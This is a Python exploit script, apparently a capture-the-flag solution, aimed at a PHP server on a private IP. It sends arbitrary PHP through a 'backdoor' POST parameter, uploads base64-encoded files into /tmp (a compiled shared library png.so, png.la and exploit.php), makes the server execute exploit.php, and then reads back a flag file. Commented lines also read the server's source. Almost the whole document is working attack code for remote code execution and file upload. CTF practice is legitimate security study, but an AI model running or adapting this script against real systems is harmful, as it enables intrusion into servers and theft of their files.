# !/usr/bin/env python3
# -*- coding: utf-8 -*-
# gcc -shared -fPIC exp.c -o png.so
import requests
import base64

session = requests.Session()
target = "http://192.168.200.129:8888/index.php"
headers = {"Cache-Control":"max-age=0","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36","Connection":"close","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8","Content-Type":"application/x-www-form-urlencoded"}
proxies = {"http":"http://127.0.0.1:7890"}
userhash = '46c01c941bd10a9c3038752f7354f2e8'

def exp(payload):
    paramsPost = {"backdoor":payload}
    # response = session.post(target, proxies=proxies, data=paramsPost, headers=headers)
    response = session.post(target, data=paramsPost, headers=headers)
    print("Status code:   %i" % response.status_code)
    print("Response body: %s" % response.content)


def put_file(filename):
    with open(filename, "rb") as f:
        data = f.read().replace(b'{REPLACE_BASEDIR}', f'/tmp/{userhash}'.encode())
        content = base64.b64encode(data).decode()

    payload  = f'echo file_put_contents("/tmp/{userhash}/{filename}",base64_decode("{content}"));'
    # print(payload)
    exp(payload)


def get_file(filename):
    payload = f'var_dump(file_get_contents("/tmp/{userhash}/{filename}"));'
    exp(payload)


def main():
    put_file('png.la')
    put_file('png.so')
    put_file('exploit.php')
    # get_file('exploit.php')
    # payload = open('exploit.php').read().replace('<?php', '').replace('?>', '')
    payload  = f'echo 1337;require "/tmp/{userhash}/exploit.php";echo 1338;'
    exp(payload)
    get_file('flag'.format(userhash))
    # get_file('/var/www/html/index.php')

if __name__ == '__main__':
    main()